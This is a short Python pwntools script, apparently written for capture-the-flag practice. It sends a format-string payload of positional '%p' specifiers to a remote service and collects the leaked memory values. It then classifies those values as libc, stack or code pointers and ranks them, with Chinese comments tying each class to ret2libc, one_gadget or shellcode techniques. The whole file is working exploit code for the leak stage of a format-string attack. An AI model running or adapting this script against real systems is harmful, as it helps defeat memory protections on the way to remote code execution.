
from pwn import remote

def classify_pointer(s):
    if not s.startswith("0x"):
        return "other"
    low = s.lower()
    if low.startswith(("0x7fff", "0x7ffe", "0x7ffd")):
        return "stack-like"
    if low.startswith("0x7f"):
        return "libc-like"
    if low.startswith(("0x40", "0x55")):
        return "code-like"
    return "other"

def rank_pointer(slot, value, cls):
    if cls == "libc-like":
        return 90, "可能為 libc 洩漏；適合 ret2libc / one_gadget 題型。"
    if cls == "stack-like":
        return 80, "可能為 stack 洩漏；適合 shellcode landing / frame 推導。"
    if cls == "code-like":
        return 60, "可能為 code pointer；可用於定位 binary base / return site。"
    return 10, "暫時無明確利用價值。"

def scan_fmt(host, port, count=30):
    io = remote(host, port)
    fmt = ".".join([f"%{i}$p" for i in range(1, count + 1)]).encode()
    io.sendline(fmt)
    line = io.recvline(timeout=3).decode(errors="ignore").strip()
    io.close()
    vals = line.split(".")
    out = []
    for i, v in enumerate(vals, 1):
        cls = classify_pointer(v)
        rank, reason = rank_pointer(i, v, cls)
        out.append({"slot": i, "value": v, "class": cls, "rank": rank, "reason": reason})
    out.sort(key=lambda x: (-x["rank"], x["slot"]))
    return out
